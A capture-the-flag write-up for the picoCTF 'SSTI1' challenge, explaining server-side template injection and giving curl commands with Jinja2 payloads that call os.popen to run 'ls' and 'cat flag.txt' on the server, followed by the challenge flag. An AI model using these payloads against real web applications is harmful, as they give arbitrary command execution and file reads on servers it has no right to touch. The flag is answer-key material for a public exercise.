
# 📝 SSTI1 Writeup

---

## 💡 Understanding Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) happens when a website processes your input as code, not just text. If exploited, this can allow you to run commands on the server.

---

## 🛠️ Solution Steps

### Step 1: Confirming SSTI and Gaining Remote Code Execution (RCE) 🕵️‍♀️🚀

First, we'll test if the input field is vulnerable to SSTI. If it is, we'll immediately try to list files on the server to confirm RCE. We'll assume the vulnerable parameter is named `announcement`.

1.  **Detecting SSTI (Optional but Recommended)**:
    We can send a simple arithmetic expression. If the server evaluates it, we know it's vulnerable.

    ```bash
    curl -X POST -d "announcement={{ 7*7 }}" [http://your-challenge-url.com/announce](http://your-challenge-url.com/announce)
    ```

    **Expected Output**: If vulnerable, the response will contain `49`.

2.  **Listing Files (Achieving RCE)**:
    Now, we'll use a Jinja2 payload to execute the `ls` command, which lists files in the current directory. This confirms we can run arbitrary commands.

    ```bash
    curl -X POST -d "announcement={{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}" [http://your-challenge-url.com/announce](http://your-challenge-url.com/announce)
    ```

    **Expected Output**: The website's response will show a list of files and directories. Look for `flag.txt` or similar files.

---

### Step 2: Retrieving the Flag 🚩

Once you've identified the flag file (e.g., `flag.txt`), use the `cat` command to read its contents.

1.  **Reading the Flag File**:
    Replace `flag.txt` with the actual flag filename if it was different from your `ls` output.

    ```bash
    curl -X POST -d "announcement={{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}" [http://your-challenge-url.com/announce](http://your-challenge-url.com/announce)
    ```

    **Expected Output**: The flag will be displayed in the website's response.

---

## 🎉 Flag

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}`



